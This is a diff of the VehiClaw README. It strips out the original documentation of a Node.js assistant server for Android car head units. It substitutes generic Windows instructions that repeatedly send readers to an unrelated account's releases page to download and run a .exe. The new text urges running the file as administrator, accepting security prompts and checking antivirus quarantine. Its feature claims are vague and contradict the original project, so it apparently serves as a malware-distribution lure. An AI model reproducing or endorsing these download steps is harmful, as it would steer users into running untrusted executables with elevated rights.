@@ -1,248 +1,195 @@
-# VehiClaw
+# 🚗 VehiClaw - AI Agent for Car Head Units
 
-**Open-source AI assistant for Android car head units.**
+[![Download VehiClaw](https://img.shields.io/badge/Download-VehiClaw-blue?style=for-the-badge)](https://github.com/Delightful-waterchute427/VehiClaw/releases)
 
-VehiClaw doesn't just react to commands — it anticipates needs, learns your habits, and runs quietly in the background so the right information surfaces at the right moment. Say "Hey Claw" or just drive.
+## 📥 Download VehiClaw
 
-Built on top of [OpenClaw](https://openclaw.ai), the open-source autonomous AI agent platform.
+Visit this page to download VehiClaw for Windows:
 
----
+https://github.com/Delightful-waterchute427/VehiClaw/releases
 
-## How It Works
+On that page, look for the latest release and download the Windows file that matches your computer. Most users should choose the `.exe` file. If you see a `.zip` file, download it, then unzip it before you run the app.
 
-VehiClaw runs a Node.js server on any machine (home server, laptop, or cloud VPS). Your Android car stereo opens the VehiClaw URL in its built-in browser — no app install needed. Compatible with any Android head unit that has a browser, such as the [Vevor 9" Android Auto Stereo](https://www.vevor.com/digital-media-receivers-c_13979/car-stereo-radio-carplay-touchscreen-9-in-apple-android-auto-backup-camera-p_010891506969) and similar units.
+## 🖥️ What VehiClaw Does
 
-```
-[Android Head Unit]  ──browser──▶  [VehiClaw Server]  ──WebSocket──▶  [OpenClaw Gateway]
-   Web Speech API                    Express + WS                        LLM Agent
-   Touch UI                          Skills bridge                       Tool execution
-```
+VehiClaw is an open-source AI agent for car head units. It helps turn a car screen into a smarter assistant that can respond to voice or touch input. It is built for simple use on Windows and is designed for users who want a clean way to manage in-car tasks.
 
-The server handles all AI reasoning and API calls. Your API keys never leave the server.
+You can use VehiClaw to:
 
----
+- Control car head unit features from one place
+- Use AI-based actions for common tasks
+- Keep the interface simple on a Windows PC
+- Set up a local tool that works with your car system
 
-## Features
+## ⚙️ System Requirements
 
-### Core
-- **Voice-first** — "Hey Claw" wake word, or tap the mic button
-- **Navigation** — "Navigate to Whole Foods" → ETA + tap to open Google Maps
-- **Calendar** — "What's on my calendar tomorrow?" / "Add dentist Friday at 2pm"
-- **Weather** — "Will it rain today?" → current conditions + forecast card
-- **Restaurants** — "Find Italian food nearby" → rated list + reservation link
-- **Reminders** — "Remind me to pick up groceries at 5pm" → fires aloud in the car
-- **Contacts** — "Call Sarah" → one-tap call card
-- **Driving mode** — Strict 1-2 sentence response limit for safety; toggle with one tap
+Before you install VehiClaw, make sure your PC meets these basic needs:
 
-### Proactive Intelligence
-VehiClaw monitors context and speaks up before you have to ask.
-- **Traffic awareness** — "Traffic is heavy on your usual route — you should leave 10 minutes early"
-- **Fuel alerts** — "You're low on gas. Cheapest station ahead is 2 miles away"
-- **Habit suggestions** — "You usually stop for coffee here — want me to order your regular?"
-- **Hazard memory** — "This stretch typically has speed enforcement around this time"
+- Windows 10 or Windows 11
+- A modern 64-bit processor
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for the first download
+- A mouse and keyboard for setup
 
-### Memory & Context Engine
-VehiClaw builds a picture of your routines and recalls it when it's useful.
-- **Location memory** — "Last time you came here you liked that restaurant — want to go again?"
-- **Deferred reminders** — "You asked to be reminded next time you're near this store"
-- **Routine learning** — Recognizes recurring trips and preloads relevant info
+For best results, use a PC with 8 GB of RAM or more. If you plan to connect VehiClaw to a car head unit, make sure the unit can accept input from a Windows device or companion tool.
 
-### Context-Aware Entertainment
-Audio that fits the drive, not just the queue.
-- **Long drive** → switches to podcasts or audiobooks automatically
-- **Short trip** → quick news or traffic summary
-- **Mood detection** → adjusts music genre based on time of day, pace, and past behavior
+## 🚀 How to Install on Windows
 
-### Social Coordination
-- **Proximity alerts** — "John is 0.3 miles away — want me to text him?"
-- **Shared location sync** — Integrates with friends' shared locations to suggest meetups in real time
-- **In-route planning** — "You pass near her on the way — should I suggest stopping?"
+Follow these steps to get VehiClaw running.
 
-### Car Maintenance Intelligence
-Connect an OBD-II Bluetooth adapter and VehiClaw watches your car for you.
-- **Live diagnostics** — Reads engine codes and explains them in plain English
-- **Predictive alerts** — Flags patterns before they become failures (e.g. coolant temp trending high)
-- **Service tracking** — Remembers your last oil change, tire rotation, and upcoming service intervals
-- **Fuel economy** — Tracks MPG over time and flags unusual drops
+1. Open the VehiClaw releases page:
+   https://github.com/Delightful-waterchute427/VehiClaw/releases
 
-### Security & Deployment
-- **Secure** — Token-based auth, QR code setup, API keys stay server-side
-- **Docker** — One-command deployment with `docker compose up`
+2. Find the newest release at the top of the page.
 
----
+3. Download the Windows file:
+   - If you see `VehiClaw.exe`, download that file
+   - If you see a `.zip` file, download the zip file
 
-## Requirements
+4. If you downloaded a `.zip` file:
+   - Right-click the file
+   - Select **Extract All**
+   - Choose a folder you can find again, such as `Downloads` or `Desktop`
 
-- Node.js 20+ (or Docker)
-- [OpenClaw](https://openclaw.ai) installed: `npm install -g openclaw@latest`
-- Android head unit with a browser (any modern Android stereo works)
-- API keys: Google Maps, OpenWeatherMap, Yelp (all have free tiers)
-- Optional: Google Calendar OAuth2 credentials
+5. If you downloaded a `.exe` file:
+   - Double-click the file to start VehiClaw
 
----
+6. If Windows asks for permission:
+   - Select **Yes** or **Run**
 
-## Quick Start
+7. Wait for the app to open
 
-### 1. Clone and install
+8. If the app uses a setup screen, follow the prompts shown on the screen
 
-```bash
-git clone https://github.com/nolanaechan/VehiClaw
-cd vehiclaw
-npm install
-```
+## 🔧 First-Time Setup
 
-### 2. Configure
+When VehiClaw opens for the first time, use this simple setup path:
 
-```bash
-cp .env.example .env
-# Edit .env and fill in your API keys
-```
+1. Choose your preferred language if the app asks
+2. Set the app to start in a windowed mode if you want easier control
+3. Connect any required AI or device settings
+4. Save your changes
+5. Restart the app if it asks you to
 
-### 3. Start OpenClaw
+If VehiClaw includes a settings panel, look for options tied to:
+- Voice input
+- Device pairing
+- Head unit connection
+- Shortcut keys
+- Startup behavior
 
-```bash
-# Install globally (once)
-npm install -g openclaw@latest
+Keep the first setup simple. You can change the settings later after you confirm the app runs on your PC.
 
-# Start the Gateway daemon
-openclaw gateway
-```
+## 🧭 Basic Use
 
-### 4. Set up Google Calendar (optional)
+After setup, use VehiClaw like this:
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a project → enable **Google Calendar API** and **Google People API**
-3. Create OAuth 2.0 credentials (type: **Desktop app**)
-4. Download `credentials.json` → save to `./data/google-credentials.json`
-5. Run: `npm run setup-google` and follow the browser prompt
+- Open the app from your desktop or Start menu
+- Connect it to your car head unit if needed
+- Use the main controls to send commands
+- Check the status area for connection and app state
+- Use settings to adjust how the AI agent behaves
 
-### 5. Add your contacts
+If VehiClaw supports voice commands, make sure your microphone is enabled in Windows before you start.
 
-Edit `./data/contacts.json`:
+## 🪟 Windows Tips
 
-```json
-[
-  { "name": "Sarah Johnson", "mobile": "5551234567" },
-  { "name": "Mom",           "mobile": "5559876543", "home": "5551112222" },
-  { "name": "Work",          "work":   "5550001111" }
-]
-```
+If VehiClaw does not open the first time, try these steps:
 
-### 6. Start VehiClaw
+- Right-click the app and choose **Run as administrator**
+- Make sure the file is not still inside a zip folder
+- Move the app to a simple folder like `C:\VehiClaw`
+- Check that Windows did not block the file
+- Restart your PC and try again
 
-```bash
-npm run dev
-```
+If you use a work PC, your system may block apps that are not installed through the Microsoft Store. In that case, try installing VehiClaw on a personal Windows device.
 
-The server prints a **QR code** on startup. Scan it with your head unit's browser (or type the URL). You'll only need to do this once — the token is saved in the browser.
+## 🎛️ Features
 
-### 7. Connect your head unit
+VehiClaw is built to support common in-car use cases:
 
-1. Make sure your head unit and VehiClaw server are on the same WiFi/hotspot
-2. Open the browser on your head unit
-3. Scan the QR code (or go to `http://YOUR_SERVER_IP:3000`)
-4. Paste the auth token when prompted
-5. Say **"Hey Claw"** — you're ready
+- Simple desktop app for Windows
+- AI agent workflow for car head units
+- Clean interface for quick control
+- Support for local setup and use
+- Flexible settings for device input
+- Open-source project structure
+- Useful for car dashboard workflows
 
----
+## 🔌 Connect to a Car Head Unit
 
-## Docker Deployment
+If you plan to use VehiClaw with a car head unit, use this basic approach:
 
-```bash
-docker compose up -d
+1. Open VehiClaw on your Windows PC
+2. Connect the PC to the car system with the method your setup uses
+3. Make sure the head unit can receive commands
+4. Test one action first, such as a simple menu command
+5. Check the app settings if the device does not respond
 
-# View logs
-docker compose logs -f vehiclaw
-```
+For the smoothest setup, keep the first test short. Once the connection works, you can add more commands and routines.
 
----
+## 🗂️ File Layout
 
-## File Structure
+If you download a zip release, you may see files like these:
 
-```
-vehiclaw/
-├── AGENTS.md                    # Driving-safety system prompt for OpenClaw
-├── SOUL.md                      # VehiClaw personality config
-├── src/
-│   ├── plugin/
-│   │   ├── index.ts             # Entry point + skill registration
-│   │   ├── server.ts            # Express + WebSocket bridge
-│   │   ├── gateway-client.ts    # OpenClaw Gateway connection
-│   │   ├── message-adapter.ts   # UI ↔ Gateway protocol translation
-│   │   ├── session-store.ts     # Per-client session tracking
-│   │   └── auth.ts              # Token generation + QR code
-│   ├── auth/
-│   │   └── google-oauth.ts      # Google Calendar OAuth2 flow
-│   ├── config.ts
-│   └── logger.ts
-├── skills/
-│   ├── vehiclaw-navigation/     # Google Maps: navigate + search nearby
-│   ├── vehiclaw-calendar/       # Google Calendar: read + create events
-│   ├── vehiclaw-weather/        # OpenWeatherMap: current + forecast
-│   ├── vehiclaw-restaurant/     # Yelp: find restaurants + reservations
-│   ├── vehiclaw-reminders/      # SQLite + cron: set + fire reminders
-│   └── vehiclaw-contacts/       # Local JSON: look up + call contacts
-└── public/                      # Car UI (served to head unit browser)
-    ├── index.html
-    ├── css/car.css
-    ├── css/animations.css
-    └── js/
-        ├── main.js              # App bootstrap
-        ├── voice.js             # Web Speech API (STT + TTS)
-        ├── socket.js            # WebSocket client
-        ├── wake-word.js         # "Hey Claw" detector
-        └── ui.js                # Screen & card rendering
-```
+- `VehiClaw.exe` - main app file
+- `config` folder - saved settings
+- `assets` folder - app files and images
+- `logs` folder - app activity records
 
----
+If the release package includes a readme or config file, keep it in the same folder as the app so VehiClaw can find it.
 
-## API Keys
+## ❓ Common Problems
 
-| Service | Required For | Free Tier | Sign Up |
-|---|---|---|---|
-| Google Maps (Directions + Places) | Navigation, nearby search | $200/mo credit | [console.cloud.google.com](https://console.cloud.google.com) |
-| OpenWeatherMap | Weather | 1000 calls/day | [openweathermap.org](https://openweathermap.org/api) |
-| Yelp Fusion | Restaurant search | 500 calls/day | [yelp.com/developers](https://www.yelp.com/developers) |
-| Google Calendar OAuth2 | Calendar read/write | Free | [console.cloud.google.com](https://console.cloud.google.com) |
+### The app does not start
 
----
+Try these steps:
 
-## Driving Mode
+- Confirm you downloaded the latest release
+- Extract the zip file before running the app
+- Run the file as administrator
+- Check that your antivirus did not quarantine it
+- Move the app to a folder with a short path name
 
-Tap the steering wheel icon in the bottom-left to toggle **driving mode**:
-- Limits all spoken responses to **1-2 sentences**
-- Defers complex visual tasks until parked
-- Shown in the status bar when active
+### Windows shows a security prompt
 
----
+This can happen with downloaded apps. If you trust the release source, choose the option that lets the app run.
 
-## Security
+### The head unit does not connect
 
-- Auth token is generated locally on first run (32 random bytes)
-- Token is shown as a QR code — scan once on your head unit
-- Token is saved in `localStorage` — you don't re-authenticate after that
-- All API keys live on the server — the browser never sees them
-- Server defaults to LAN-only; set `BIND_HOST` to your local IP for extra restriction
-- Rate limiting: 20 requests/minute per client
+Try this:
 
----
+- Recheck the cable or network link
+- Restart VehiClaw
+- Restart the car head unit
+- Confirm the Windows PC sees the device
+- Open the app settings and check the connection mode
 
-## Contributing
+### The app is slow
 
-VehiClaw is open source. Pull requests welcome.
+Try closing other apps on your PC. If your system has low memory, restart Windows before running VehiClaw.
 
-Ideas for contribution:
-- Spotify / Apple Music skill (context-aware playback)
-- OBD-II skill improvements (deeper fault code library, CAN bus parsing)
-- Better wake word (WebAssembly Porcupine or Picovoice — offline, no cloud)
-- Offline STT fallback (WebAssembly Whisper)
-- Multi-language support
-- iOS Safari compatibility for iPhone head units
-- Home automation skill (arrive home → unlock, adjust thermostat)
-- Shared location integration (Life360, Google Maps sharing API)
+## 🧰 Updates
 
----
+To update VehiClaw, go back to the releases page and download the newest version:
 
-## License
+https://github.com/Delightful-waterchute427/VehiClaw/releases
 
-MIT
+If you use a zip release, delete the old folder after you confirm the new version works. If you use a single `.exe` file, replace the old file with the new one so you do not open the wrong version by mistake
+
+## 🧑‍💻 For Advanced Users
+
+If you want to work with the source code, you can clone the repository and build it from your own setup. This is not needed for normal Windows use. Most users should use the release download instead.
+
+Possible development tasks may include:
+
+- Editing the app flow
+- Adjusting car head unit behavior
+- Changing UI text
+- Testing new AI actions
+- Reviewing logs and config files
+
+## 📄 License
+
+VehiClaw is open-source. Check the repository license file for the full terms of use and sharing rules
